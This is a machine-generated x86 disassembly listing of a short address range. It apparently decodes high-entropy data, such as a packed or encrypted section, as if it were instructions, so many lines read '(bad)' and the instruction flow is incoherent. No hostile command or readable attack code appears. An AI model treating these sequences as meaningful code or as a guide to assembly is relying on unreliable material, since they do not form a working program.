  40422f:	ae                   	scas   %es:(%edi),%al
  404230:	b5 d6                	mov    $0xd6,%ch
  404232:	d7                   	xlat   %ds:(%ebx)
  404233:	30 14 f3             	xor    %dl,(%ebx,%esi,8)
  404236:	2d 2a 5e df 96       	sub    $0x96df5e2a,%eax
  40423b:	12 9d 93 5d 8b 0e    	adc    0xe8b5d93(%ebp),%bl
  404241:	52                   	push   %edx
  404242:	3e 2d 5d 59 47 99    	ds sub $0x9947595d,%eax
  404248:	68 5e d2 53 79       	push   $0x7953d25e
  40424d:	38 c9                	cmp    %cl,%cl
  40424f:	6a 47                	push   $0x47
  404251:	44                   	inc    %esp
  404252:	d4 75                	aam    $0x75
  404254:	ab                   	stos   %eax,%es:(%edi)
  404255:	7b 7d                	jnp    0x4042d4
  404257:	9b                   	fwait
  404258:	cb                   	lret
  404259:	aa                   	stos   %al,%es:(%edi)
  40425a:	47                   	inc    %edi
  40425b:	53                   	push   %ebx
  40425c:	29 1d 5b 76 34 10    	sub    %ebx,0x1034765b
  404262:	85 50 bc             	test   %edx,-0x44(%eax)
  404265:	9d                   	popf
  404266:	df c1                	ffreep %st(1)
  404268:	f7 b9 b6 81 fc 6b    	idivl  0x6bfc81b6(%ecx)
  40426e:	64 c7 42 53 16 86 cb 	movl   $0xdecb8616,%fs:0x53(%edx)
  404275:	de 
  404276:	b6 6d                	mov    $0x6d,%dh
  404278:	5b                   	pop    %ebx
  404279:	76 b5                	jbe    0x404230
  40427b:	18 4d 53             	sbb    %cl,0x53(%ebp)
  40427e:	b4 4e                	mov    $0x4e,%ah
  404280:	4f                   	dec    %edi
  404281:	5b                   	pop    %ebx
  404282:	54                   	push   %esp
  404283:	ef                   	out    %eax,(%dx)
  404284:	a2 12 6a ad 96       	mov    %al,0x96ad6a12
  404289:	fd                   	std
  40428a:	03 51 f7             	add    -0x9(%ecx),%edx
  40428d:	ed                   	in     (%dx),%eax
  40428e:	53                   	push   %ebx
  40428f:	f5                   	cmc
  404290:	bb 97 3d 50 9b       	mov    $0x9b503d97,%ebx
  404295:	49                   	dec    %ecx
  404296:	b2 01                	mov    $0x1,%dl
  404298:	8d 32                	lea    (%edx),%esi
  40429a:	5f                   	pop    %edi
  40429b:	f7 a6 3d 1e 72 1a    	mull   0x1a721e3d(%esi)
  4042a1:	75 9d                	jne    0x404240
  4042a3:	fe                   	(bad)
  4042a4:	70 f7                	jo     0x40429d
  4042a6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4042a7:	db 21                	(bad) (%ecx)
  4042a9:	57                   	push   %edi
  4042aa:	92                   	xchg   %eax,%edx
  4042ab:	b6 53                	mov    $0x53,%dh
  4042ad:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4042ae:	5c                   	pop    %esp
  4042af:	77 bf                	ja     0x404270
  4042b1:	b3 67                	mov    $0x67,%bl
  4042b3:	24 da                	and    $0xda,%al
  4042b5:	4a                   	dec    %edx
  4042b6:	49                   	dec    %ecx
  4042b7:	67 64 b5 0c          	addr16 fs mov $0xc,%ch
  4042bb:	4c                   	dec    %esp
  4042bc:	fa                   	cli
  4042bd:	69 b7 b4 3b 3f 23 ad 	imul   $0xedc63ad,0x233f3bb4(%edi),%esi
  4042c4:	63 dc 0e 
  4042c7:	e9 4d a2 d3 b1       	jmp    0xb213e519
  4042cc:	25 14 f5 1d e9       	and    $0xe91df514,%eax
  4042d1:	df de                	(bad)
  4042d3:	d6                   	salc
  4042d4:	ea 1e 43 f6 64 20 4f 	ljmp   $0x4f20,$0x64f6431e
  4042db:	eb fc                	jmp    0x4042d9
  4042dd:	ef                   	out    %eax,(%dx)
  4042de:	34 20                	xor    $0x20,%al
  4042e0:	56                   	push   %esi
  4042e1:	5e                   	pop    %esi
  4042e2:	87 cc                	xchg   %ecx,%esp
  4042e4:	32 1e                	xor    (%esi),%bl
  4042e6:	9d                   	popf
  4042e7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4042e8:	ba 4f d9 c1 8a       	mov    $0x8ac1d94f,%edx
  4042ed:	e1 55                	loope  0x404344
  4042ef:	12 d5                	adc    %ch,%dl
  4042f1:	10 b2 6d 55 d0 8f    	adc    %dh,-0x702faa93(%edx)
  4042f7:	bb ce 1e 77 8c       	mov    $0x8c771ece,%ebx
  4042fc:	a9 17 d7 f2 d7       	test   $0xd7f2d717,%eax
  404301:	b2 70                	mov    $0x70,%dl
  404303:	69 f7 46 4d 76 af    	imul   $0xaf764d46,%edi,%esi
  404309:	61                   	popa
  40430a:	d1 92 ca 6b d1 4d    	rcll   $1,0x4dd16bca(%edx)
  404310:	48                   	dec    %eax
  404311:	eb 9c                	jmp    0x4042af
  404313:	4c                   	dec    %esp
  404314:	e7 4e                	out    %eax,$0x4e
  404316:	a0 f4 9d 65 9f       	mov    0x9f659df4,%al
  40431b:	88 f6                	mov    %dh,%dh
  40431d:	ff 96 bf 0e 14 b7    	call   *-0x48ebf141(%esi)
  404323:	2f                   	das
  404324:	bb 37 54 4c db       	mov    $0xdb4c5437,%ebx
  404329:	df 90 6a 49 df f9    	fists  -0x620b696(%eax)
  40432f:	77 fb                	ja     0x40432c
  404331:	dd a2 61 52 2f 6d    	frstor 0x6d2f5261(%edx)
  404337:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404338:	f6 76 56             	divb   0x56(%esi)
  40433b:	f7 ba 18 b4 df 82    	idivl  -0x7d204be8(%edx)
  404341:	41                   	inc    %ecx
  404342:	47                   	inc    %edi
  404343:	ff 96 bf 4f 43 16    	call   *0x16434fbf(%esi)
  404349:	cf                   	iret
  40434a:	93                   	xchg   %eax,%ebx
  40434b:	de d6                	(bad)
  40434d:	4d                   	dec    %ebp
  40434e:	c6                   	(bad)
  40434f:	56                   	push   %esi
  404350:	13 47 25             	adc    0x25(%edi),%eax
  404353:	d3 76 f7             	shll   %cl,-0x9(%esi)
  404356:	46                   	inc    %esi
  404357:	89 26                	mov    %esp,(%esi)
  404359:	22 96 ba dd 6f c8    	and    -0x37902246(%esi),%dl
  40435f:	b5 9d                	mov    $0x9d,%ch
  404361:	6f                   	outsl  %ds:(%esi),(%dx)
  404362:	52                   	push   %edx
  404363:	0d 49 c3 44 d9       	or     $0xd944c349,%eax
  404368:	d9 ef                	(bad)
  40436a:	16                   	push   %ss
  40436b:	50                   	push   %eax
  40436c:	36 03 4d f5          	add    %ss:-0xb(%ebp),%ecx
  404370:	3f                   	aas
  404371:	9b                   	fwait
  404372:	1d 4f 59 00 64       	sbb    $0x6400594f,%eax
  404377:	ee                   	out    %al,(%dx)
  404378:	61                   	popa
  404379:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40437a:	54                   	push   %esp
  40437b:	3e b5 7e             	ds mov $0x7e,%ch
  40437e:	95                   	xchg   %eax,%ebp
  40437f:	db eb                	fucomi %st(3),%st
  404381:	5b                   	pop    %ebx
  404382:	57                   	push   %edi
  404383:	39 b2 df 34 21 ee    	cmp    %esi,-0x11decb21(%edx)
  404389:	3b df                	cmp    %edi,%ebx
  40438b:	57                   	push   %edi
  40438c:	f2 77 bb             	bnd ja 0x40434a
  40438f:	67 e5 77             	addr16 in $0x77,%eax
  404392:	b7 98                	mov    $0x98,%bh
  404394:	12 fc                	adc    %ah,%bh
  404396:	3c b6                	cmp    $0xb6,%al
  404398:	b6 eb                	mov    $0xeb,%dh
  40439a:	59                   	pop    %ecx
  40439b:	eb 5a                	jmp    0x4043f7
  40439d:	14 c3                	adc    $0xc3,%al
  40439f:	34 bd                	xor    $0xbd,%al
  4043a1:	9d                   	popf
  4043a2:	48                   	dec    %eax
  4043a3:	8f                   	(bad)
  4043a4:	a1 74 af 51 ba       	mov    0xba51af74,%eax
  4043a9:	75 f7                	jne    0x4043a2
  4043ab:	4c                   	dec    %esp
  4043ac:	f3 9a 38 fd 7d a0 73 	repz lcall $0x2073,$0xa07dfd38
  4043b3:	20 
  4043b4:	ae                   	scas   %es:(%edi),%al
  4043b5:	f3 53                	repz push %ebx
  4043b7:	95                   	xchg   %eax,%ebp
  4043b8:	b5 2d                	mov    $0x2d,%ch
  4043ba:	af                   	scas   %es:(%edi),%eax
  4043bb:	12 55 38             	adc    0x38(%ebp),%dl
  4043be:	90                   	nop
  4043bf:	d5 3f                	aad    $0x3f
  4043c1:	4e                   	dec    %esi
  4043c2:	96                   	xchg   %eax,%esi
  4043c3:	af                   	scas   %es:(%edi),%eax
  4043c4:	46                   	inc    %esi
  4043c5:	5a                   	pop    %edx
  4043c6:	d6                   	salc
  4043c7:	4c                   	dec    %esp
  4043c8:	45                   	inc    %ebp
  4043c9:	5e                   	pop    %esi
  4043ca:	98                   	cwtl
  4043cb:	fc                   	cld
  4043cc:	34 45                	xor    $0x45,%al
  4043ce:	49                   	dec    %ecx
  4043cf:	4a                   	dec    %edx
  4043d0:	bd 23 f9 c3 64       	mov    $0x64c3f923,%ebp
  4043d5:	8e 29                	mov    (%ecx),%gs
  4043d7:	b9 a2 ef 5e 53       	mov    $0x535eefa2,%ecx
  4043dc:	5f                   	pop    %edi
  4043dd:	33 aa f5 5a b0 3f    	xor    0x3fb05af5(%edx),%ebp
  4043e3:	9b                   	fwait
  4043e4:	00 96 7f 2e a6 1a    	add    %dl,0x1aa62e7f(%esi)
  4043ea:	87 13                	xchg   %edx,(%ebx)
  4043ec:	21 bf 58 d9 f3 28    	and    %edi,0x28f3d958(%edi)
  4043f2:	4d                   	dec    %ebp
  4043f3:	4e                   	dec    %esi
  4043f4:	f6 29                	imulb  (%ecx)
  4043f6:	0b 46 47             	or     0x47(%esi),%eax
  4043f9:	ff                   	(bad)
  4043fa:	fe                   	(bad)
  4043fb:	30 ca                	xor    %cl,%dl
  4043fd:	44                   	inc    %esp
  4043fe:	a0 fc 0b e5 d5       	mov    0xd5e50bfc,%al
  404403:	7f 7a                	jg     0x40447f
  404405:	5c                   	pop    %esp
  404406:	a0 ad 6f 12 57       	mov    0x57126fad,%al
  40440b:	bd ee 49 b8 83       	mov    $0x83b849ee,%ebp
  404410:	ad                   	lods   %ds:(%esi),%eax
  404411:	9a 10 f9 72 64 9c 77 	lcall  $0x779c,$0x6472f910
  404418:	65 d9 37             	fnstenv %gs:(%edi)
  40441b:	02 4e 5a             	add    0x5a(%esi),%cl
  40441e:	50                   	push   %eax
  40441f:	6c                   	insb   (%dx),%es:(%edi)
  404420:	d3 57 a4             	rcll   %cl,-0x5c(%edi)
  404423:	9c                   	pushf
  404424:	6a aa                	push   $0xffffffaa
  404426:	be 22 db e3 6c       	mov    $0x6ce3db22,%esi
  40442b:	2f                   	das
  40442c:	23 da                	and    %edx,%ebx
  40442e:	2b aa f3 bf 4f bd    	sub    -0x42b0400d(%edx),%ebp
  404434:	d6                   	salc
  404435:	e5 8f                	in     $0x8f,%eax
  404437:	14 d1                	adc    $0xd1,%al
  404439:	76 7a                	jbe    0x4044b5
  40443b:	1c 56                	sbb    $0x56,%al
  40443d:	5d                   	pop    %ebp
  40443e:	cb                   	lret
  40443f:	6f                   	outsl  %ds:(%esi),(%dx)
  404440:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404441:	18 03                	sbb    %al,(%ebx)
  404443:	72 df                	jb     0x404424
  404445:	6c                   	insb   (%dx),%es:(%edi)
  404446:	41                   	inc    %ecx
  404447:	fe                   	(bad)
  404448:	ee                   	out    %al,(%dx)
  404449:	3f                   	aas
  40444a:	e3 a8                	jecxz  0x4043f4
  40444c:	b9 b6 23 19 96       	mov    $0x961923b6,%ecx
  404451:	6a e5                	push   $0xffffffe5
  404453:	65 7a cd             	gs jp  0x404423
  404456:	db 97 95 4b 46 93    	fistl  -0x6cb9b46b(%edi)
  40445c:	6c                   	insb   (%dx),%es:(%edi)
  40445d:	06                   	push   %es
  40445e:	b4 33                	mov    $0x33,%ah
  404460:	ae                   	scas   %es:(%edi),%al
  404461:	7d b1                	jge    0x404414
  404463:	d7                   	xlat   %ds:(%ebx)
  404464:	a8 1d                	test   $0x1d,%al
  404466:	f3 77 58             	repz ja 0x4044c1
  404469:	b7 65                	mov    $0x65,%bh
  40446b:	4f                   	dec    %edi
  40446c:	d3 1e                	rcrl   %cl,(%esi)
  40446e:	77 da                	ja     0x40444a
  404470:	7b d1                	jnp    0x404443
  404472:	fd                   	std
  404473:	36 2e eb 24          	ss cs jmp 0x40449b
  404477:	97                   	xchg   %eax,%edi
  404478:	1d 2b a6 53 ae       	sbb    $0xae53a62b,%eax
  40447d:	01 b4 4e f8 36 05 d3 	add    %esi,-0x2cfac908(%esi,%ecx,2)
  404484:	37                   	aaa
  404485:	75 dd                	jne    0x404464
  404487:	6a d8                	push   $0xffffffd8
  404489:	ed                   	in     (%dx),%eax
  40448a:	7e 3f                	jle    0x4044cb
  40448c:	30 8f bc 46 e6 4c    	xor    %cl,0x4ce646bc(%edi)
  404492:	d9 b7 65 95 14 b5    	fnstenv -0x4aeb6a9b(%edi)
  404498:	2d 88 9a 55 d7       	sub    $0xd7559a88,%eax
  40449d:	99                   	cltd
  40449e:	ee                   	out    %al,(%dx)
  40449f:	c9                   	leave
  4044a0:	3c b9                	cmp    $0xb9,%al
  4044a2:	0f 98 35 b8 8d a2 d7 	sets   0xd7a28db8
  4044a9:	6c                   	insb   (%dx),%es:(%edi)
  4044aa:	00 3b                	add    %bh,(%ebx)
  4044ac:	fe                   	(bad)
  4044ad:	9b                   	fwait
  4044ae:	50                   	push   %eax
  4044af:	6d                   	insl   (%dx),%es:(%edi)
  4044b0:	16                   	push   %ss
  4044b1:	c3                   	ret
  4044b2:	b2 78                	mov    $0x78,%dl
  4044b4:	54                   	push   %esp
  4044b5:	57                   	push   %edi
  4044b6:	b0 ea                	mov    $0xea,%al
  4044b8:	cf                   	iret
  4044b9:	93                   	xchg   %eax,%ebx
  4044ba:	42                   	inc    %edx
  4044bb:	d3 cd                	ror    %cl,%ebp
  4044bd:	d3 54 7d 03          	rcll   %cl,0x3(%ebp,%edi,2)
  4044c1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4044c2:	b6 5f                	mov    $0x5f,%dh
  4044c4:	8a b6 7b 52 90 7c    	mov    0x7c90527b(%esi),%dh
  4044ca:	df 2b                	fildll (%ebx)
  4044cc:	f1                   	int1
  4044cd:	e7 f4                	out    %eax,$0xf4
  4044cf:	66 0e                	pushw  %cs
  4044d1:	5d                   	pop    %ebp
  4044d2:	4e                   	dec    %esi
  4044d3:	b2 6d                	mov    $0x6d,%dl
  4044d5:	4d                   	dec    %ebp
  4044d6:	73 94                	jae    0x40446c
  4044d8:	f8                   	clc
  4044d9:	bd 50 42 af 73       	mov    $0x73af4250,%ebp
  4044de:	e2 58                	loop   0x404538
  4044e0:	c5 4b f2             	lds    -0xe(%ebx),%ecx
  4044e3:	1f                   	pop    %ds
  4044e4:	45                   	inc    %ebp
  4044e5:	ae                   	scas   %es:(%edi),%al
  4044e6:	b2 6d                	mov    $0x6d,%dl
  4044e8:	51                   	push   %ecx
  4044e9:	18 57 c6             	sbb    %dl,-0x3a(%edi)
  4044ec:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4044ed:	8b 3e                	mov    (%esi),%edi
  4044ef:	b1 7d                	mov    $0x7d,%cl
  4044f1:	cb                   	lret
  4044f2:	5f                   	pop    %edi
  4044f3:	1e                   	push   %ds
  4044f4:	f6 9a 29 82 4d 8d    	negb   -0x72b27dd7(%edx)
  4044fa:	8b 2a                	mov    (%edx),%ebp
  4044fc:	9c                   	pushf
  4044fd:	16                   	push   %ss
  4044fe:	9f                   	lahf
  4044ff:	6b 18 6d             	imul   $0x6d,(%eax),%ebx
  404502:	32 4c aa fc          	xor    -0x4(%edx,%ebp,4),%cl
  404506:	97                   	xchg   %eax,%edi
  404507:	c5 f1 80             	(bad)
  40450a:	78 84                	js     0x404490
  40450c:	48                   	dec    %eax
  40450d:	33 40 b2             	xor    -0x4e(%eax),%eax
  404510:	d2 54 e3 45          	rclb   %cl,0x45(%ebx,%eiz,8)
  404514:	f7 0f c8 0e 13 7b    	testl  $0x7b130ec8,(%edi)
  40451a:	dd b6 99 9d ce 8f    	fnsave -0x70316267(%esi)
  404520:	a0 36 2d bb 16       	mov    0x16bb2d36,%al
  404525:	48                   	dec    %eax
  404526:	fc                   	cld
  404527:	b3 c3                	mov    $0xc3,%bl
  404529:	2d b4 6d f9 dd       	sub    $0xddf96db4,%eax
  40452e:	10 4d 93             	adc    %cl,-0x6d(%ebp)
  404531:	fc                   	cld
  404532:	46                   	inc    %esi
  404533:	4b                   	dec    %ebx
  404534:	b8 92 55 59 56       	mov    $0x56595592,%eax
  404539:	16                   	push   %ss
  40453a:	eb d9                	jmp    0x404515
  40453c:	d6                   	salc
  40453d:	b5 3a                	mov    $0x3a,%ch
  40453f:	b5 6d                	mov    $0x6d,%ch
  404541:	8b 18                	mov    (%eax),%ebx
  404543:	ce                   	into
  404544:	ac                   	lods   %ds:(%esi),%al
  404545:	9d                   	popf
  404546:	e4 2d                	in     $0x2d,%al
  404548:	4c                   	dec    %esp
  404549:	42                   	inc    %edx
  40454a:	3c ad                	cmp    $0xad,%al
  40454c:	ff 50 f4             	call   *-0xc(%eax)
  40454f:	3a dd                	cmp    %ch,%bl
  404551:	3b bf 6b 57 2e 0f    	cmp    0xf2e576b(%edi),%edi
  404557:	8d                   	lea    (bad),%ebp
  404558:	ea 37 34 9b f6 3e 9d 	ljmp   $0x9d3e,$0xf69b3437
  40455f:	1a 75 df             	sbb    -0x21(%ebp),%dh
  404562:	7a 45                	jp     0x4045a9
  404564:	ef                   	out    %eax,(%dx)
  404565:	00 39                	add    %bh,(%ecx)
  404567:	1c 27                	sbb    $0x27,%al
  404569:	89 b6 fb 48 a4 ae    	mov    %esi,-0x515bb705(%esi)
  40456f:	e5 1b                	in     $0x1b,%eax
  404571:	61                   	popa
  404572:	c4 55 4c             	les    0x4c(%ebp),%edx
  404575:	00 6c b7 8d          	add    %ch,-0x73(%edi,%esi,4)
  404579:	f2 53                	repnz push %ebx
  40457b:	2e 88 36             	mov    %dh,%cs:(%esi)
  40457e:	0f f7 fa             	maskmovq %mm2,%mm7
  404581:	47                   	inc    %edi
  404582:	d3 af 03 42 6c 62    	shrl   %cl,0x626c4203(%edi)
  404588:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404589:	7d 2c                	jge    0x4045b7
  40458b:	2a ca                	sub    %dl,%cl
  40458d:	05 ab 5d fe 6e       	add    $0x6efe5dab,%eax
  404592:	75 2c                	jne    0x4045c0
  404594:	bf f4 82 29 45       	mov    $0x452982f4,%edi
  404599:	97                   	xchg   %eax,%edi
  40459a:	f9                   	stc
  40459b:	3b d7                	cmp    %edi,%edx
  40459d:	32 ef                	xor    %bh,%ch
  40459f:	e7 6a                	out    %eax,$0x6a
  4045a1:	ee                   	out    %al,(%dx)
  4045a2:	dc 56 b1             	fcoml  -0x4f(%esi)
  4045a5:	86 3d df 89 57 46    	xchg   %bh,0x465789df
  4045ab:	28 ef                	sub    %ch,%bh
  4045ad:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4045ae:	3a 33                	cmp    (%ebx),%dh
  4045b0:	82 1b ac             	sbbb   $0xac,(%ebx)
  4045b3:	55                   	push   %ebp
  4045b4:	c6                   	(bad)
  4045b5:	f7 7a 8d             	idivl  -0x73(%edx)
  4045b8:	52                   	push   %edx
  4045b9:	5f                   	pop    %edi
  4045ba:	6b 17 8d             	imul   $0xffffff8d,(%edi),%edx
  4045bd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4045be:	b6 85                	mov    $0x85,%dh
  4045c0:	14 52                	adc    $0x52,%al
  4045c2:	3b 37                	cmp    (%edi),%esi
  4045c4:	aa                   	stos   %al,%es:(%edi)
  4045c5:	7f 5a                	jg     0x404621
  4045c7:	fe                   	(bad)
  4045c8:	7c e3                	jl     0x4045ad
  4045ca:	41                   	inc    %ecx
  4045cb:	16                   	push   %ss
  4045cc:	5d                   	pop    %ebp
  4045cd:	b0 42                	mov    $0x42,%al
  4045cf:	5f                   	pop    %edi
  4045d0:	00 ce                	add    %cl,%dh
  4045d2:	07                   	pop    %es
  4045d3:	d8 de                	fcomp  %st(6)
  4045d5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4045d6:	88 9f d5 5f 4a ff    	mov    %bl,-0xb5a02b(%edi)
  4045dc:	e4 0a                	in     $0xa,%al
  4045de:	99                   	cltd
  4045df:	ae                   	scas   %es:(%edi),%al
  4045e0:	28 9b 76 64 04 a9    	sub    %bl,-0x56fb9b8a(%ebx)
  4045e6:	7f a2                	jg     0x40458a
  4045e8:	f5                   	cmc
  4045e9:	53                   	push   %ebx
  4045ea:	ed                   	in     (%dx),%eax
  4045eb:	75 4e                	jne    0x40463b
  4045ed:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4045ee:	68 1e 6b 6f ed       	push   $0xed6f6b1e
  4045f3:	dc 2b                	fsubrl (%ebx)
  4045f5:	99                   	cltd
  4045f6:	fd                   	std
  4045f7:	ba a5 ac 73 26       	mov    $0x2673aca5,%edx
  4045fc:	8b ca                	mov    %edx,%ecx
  4045fe:	e3 25                	jecxz  0x404625
  404600:	52                   	push   %edx
  404601:	3a 61 66             	cmp    0x66(%ecx),%ah
  404604:	f9                   	stc
  404605:	16                   	push   %ss
  404606:	68 cf 9b fc 35       	push   $0x35fc9bcf
  40460b:	48                   	dec    %eax
  40460c:	5b                   	pop    %ebx
  40460d:	38 a4 69 6d 29 e9 42 	cmp    %ah,0x42e9296d(%ecx,%ebp,2)
  404614:	a2 f9 44 f9 b6       	mov    %al,0xb6f944f9
  404619:	fa                   	cli
  40461a:	f3 8c 98 24 aa 6d 6e 	repz mov %ds,0x6e6daa24(%eax)
  404621:	4b                   	dec    %ebx
  404622:	5d                   	pop    %ebp
  404623:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404624:	69 36 da cf 67 70    	imul   $0x7067cfda,(%esi),%esi
  40462a:	5a                   	pop    %edx
  40462b:	f3 22 eb             	repz and %bl,%ch
  40462e:	70 5e                	jo     0x40468e
  404630:	99                   	cltd
  404631:	ea 99 0e b5 70 f2 63 	ljmp   $0x63f2,$0x70b50e99
  404638:	6f                   	outsl  %ds:(%esi),(%dx)
  404639:	f9                   	stc
  40463a:	db 9a 14 a4 e9 ee    	fistpl -0x11165bec(%edx)
  404640:	f5                   	cmc
  404641:	56                   	push   %esi
  404642:	3d b2 7f 62 aa       	cmp    $0xaa627fb2,%eax
  404647:	17                   	pop    %ss
  404648:	d5 b5                	aad    $0xb5
  40464a:	73 a9                	jae    0x4045f5
  40464c:	7e b9                	jle    0x404607
  40464e:	ca 73 b1             	lret   $0xb173
  404651:	fb                   	sti
  404652:	b2 7b                	mov    $0x7b,%dl
  404654:	76 ec                	jbe    0x404642
  404656:	fe                   	(bad)
  404657:	93                   	xchg   %eax,%ebx
  404658:	2f                   	das
  404659:	12 ed                	adc    %ch,%ch
  40465b:	13 d9                	adc    %ecx,%ebx
  40465d:	b7 73                	mov    $0x73,%bh
  40465f:	74 88                	je     0x4045e9
  404661:	ae                   	scas   %es:(%edi),%al
  404662:	5b                   	pop    %ebx
  404663:	7a 74                	jp     0x4046d9
  404665:	34 a9                	xor    $0xa9,%al
  404667:	b2 72                	mov    $0x72,%dl
  404669:	3b 92 ed 5a 1a d6    	cmp    -0x29e5a513(%edx),%edx
  40466f:	ba 20 5a 69 d5       	mov    $0xd5695a20,%edx
  404674:	b8 ef 02 b2 69       	mov    $0x69b202ef,%eax
  404679:	42                   	inc    %edx
  40467a:	e6 26                	out    %al,$0x26
  40467c:	80 a9 b9 c3 de b2 6c 	subb   $0x6c,-0x4d213c47(%ecx)
  404683:	5d                   	pop    %ebp
  404684:	3d b9 38 9e 68       	cmp    $0x689e38b9,%eax
  404689:	5c                   	pop    %esp
  40468a:	12 a2 7e 15 d9 3d    	adc    0x3dd9157e(%edx),%ah
  404690:	70 73                	jo     0x404705
  404692:	e2 7f                	loop   0x404713
  404694:	09 28                	or     %ebp,(%eax)
  404696:	2f                   	das
  404697:	96                   	xchg   %eax,%esi
  404698:	e5 f2                	in     $0xf2,%eax
  40469a:	2c 71                	sub    $0x71,%al
  40469c:	b0 c2                	mov    $0xc2,%al
  40469e:	16                   	push   %ss
  40469f:	2f                   	das
  4046a0:	29 79 5a             	sub    %edi,0x5a(%ecx)
  4046a3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4046a4:	59                   	pop    %ecx
  4046a5:	20 de                	and    %bl,%dh
  4046a7:	56                   	push   %esi
  4046a8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4046a9:	f5                   	cmc
  4046aa:	f2 c6                	repnz (bad)
  4046ac:	15 95 28 dd 4a       	adc    $0x4add2895,%eax
  4046b1:	68 f5 b5 eb 77       	push   $0x77ebb5f5
  4046b6:	de 53 e9             	ficoms -0x17(%ebx)
  4046b9:	cf                   	iret
  4046ba:	22 cc                	and    %ah,%cl
  4046bc:	69 05 8b bf 2a 52 db 	imul   $0x1193e6db,0x522abf8b,%eax
  4046c3:	e6 93 11 
  4046c6:	fb                   	sti
  4046c7:	3b a2 c7 2b 91 67    	cmp    0x67912bc7(%edx),%esp
  4046cd:	64 8d 53 d1          	lea    %fs:-0x2f(%ebx),%edx
  4046d1:	28 2c 0a             	sub    %ch,(%edx,%ecx,1)
  4046d4:	53                   	push   %ebx
  4046d5:	cd 44                	int    $0x44
  4046d7:	97                   	xchg   %eax,%edi
  4046d8:	c7                   	(bad)
  4046d9:	e9 cd f9 26 98       	jmp    0x986740ab
  4046de:	ea b2 49 ec df e2 65 	ljmp   $0x65e2,$0xdfec49b2
  4046e5:	fa                   	cli
  4046e6:	7c 30                	jl     0x404718
  4046e8:	3a 57 95             	cmp    -0x6b(%edi),%dl
  4046eb:	c3                   	ret
  4046ec:	54                   	push   %esp
  4046ed:	56                   	push   %esi
  4046ee:	28 86 69 42 6f dd    	sub    %al,-0x2290bd97(%esi)
  4046f4:	33 ee                	xor    %esi,%ebp
  4046f6:	64 bb 7c 26 fe 5c    	fs mov $0x5cfe267c,%ebx
  4046fc:	6c                   	insb   (%dx),%es:(%edi)
  4046fd:	4e                   	dec    %esi
  4046fe:	d3 52 f9             	rcll   %cl,-0x7(%edx)
  404701:	4c                   	dec    %esp
  404702:	44                   	inc    %esp
  404703:	d7                   	xlat   %ds:(%ebx)
  404704:	44                   	inc    %esp
  404705:	fa                   	cli
  404706:	28 d1                	sub    %dl,%cl
  404708:	2b 97 cd 29 79 bd    	sub    -0x4286d633(%edi),%edx
  40470e:	2f                   	das
  40470f:	4b                   	dec    %ebx
  404710:	fd                   	std
  404711:	23 c9                	and    %ecx,%ecx
  404713:	88 38                	mov    %bh,(%eax)
  404715:	d9 00                	flds   (%eax)
  404717:	6c                   	insb   (%dx),%es:(%edi)
  404718:	b1 9c                	mov    $0x9c,%cl
  40471a:	0c ed                	or     $0xed,%al
  40471c:	4c                   	dec    %esp
  40471d:	fe 0d 51 66 14 26    	decb   0x26146651
  404723:	2a b6 75 32 5a 57    	sub    0x575a3275(%esi),%dh
  404729:	da 7a 29             	fidivrl 0x29(%edx)
  40472c:	ab                   	stos   %eax,%es:(%edi)
  40472d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40472e:	d2 28                	shrb   %cl,(%eax)
  404730:	f5                   	cmc
  404731:	61                   	popa
  404732:	ca a7 29             	lret   $0x29a7
  404735:	59                   	pop    %ecx
  404736:	04 9c                	add    $0x9c,%al
  404738:	9a 32 ff b2 9d 6c 74 	lcall  $0x746c,$0x9db2ff32
  40473f:	66 a7                	cmpsw  %es:(%edi),%ds:(%esi)
  404741:	24 3a                	and    $0x3a,%al
  404743:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404744:	3e e8 5b 21 de 54    	ds call 0x551e68a5
  40474a:	6e                   	outsb  %ds:(%esi),(%dx)
  40474b:	d1 70 ab             	shll   $1,-0x55(%eax)
  40474e:	db 72 79             	(bad) 0x79(%edx)
  404751:	9b                   	fwait
  404752:	fa                   	cli
  404753:	b6 46                	mov    $0x46,%dh
  404755:	20 77 38             	and    %dh,0x38(%edi)
  404758:	db fc                	(bad)
  40475a:	18 d9                	sbb    %bl,%cl
  40475c:	2e 47                	cs inc %edi
  40475e:	56                   	push   %esi
  40475f:	2c fb                	sub    $0xfb,%al
  404761:	33 6c cd 34          	xor    0x34(%ebp,%ecx,8),%ebp
  404765:	dc ae 98 6d 13 d5    	fsubrl -0x2aec9268(%esi)
  40476b:	6a 0e                	push   $0xe
  40476d:	ad                   	lods   %ds:(%esi),%eax
  40476e:	6e                   	outsb  %ds:(%esi),(%dx)
  40476f:	e5 c7                	in     $0xc7,%eax
  404771:	31 b4 e7 c5 d3 72 03 	xor    %esi,0x372d3c5(%edi,%eiz,8)
  404778:	98                   	cwtl
  404779:	bd 13 2e a2 62       	mov    $0x62a22e13,%ebp
  40477e:	c9                   	leave
  40477f:	05 68 dc f7 91       	add    $0x91f7dc68,%eax
  404784:	cd 28                	int    $0x28
  404786:	73 fb                	jae    0x404783
  404788:	35 f1 78 99 e2       	xor    $0xe29978f1,%eax
  40478d:	e7 e5                	out    %eax,$0xe5
  40478f:	4e                   	dec    %esi
  404790:	54                   	push   %esp
  404791:	51                   	push   %ecx
  404792:	d3 fd                	sar    %cl,%ebp
  404794:	45                   	inc    %ebp
  404795:	fe                   	(bad)
  404796:	38 d1                	cmp    %dl,%cl
  404798:	3f                   	aas
  404799:	65 57                	gs push %edi
  40479b:	35 fb 5e 26 45       	xor    $0x45265efb,%eax
  4047a0:	74 6a                	je     0x40480c
  4047a2:	47                   	inc    %edi
  4047a3:	ce                   	into
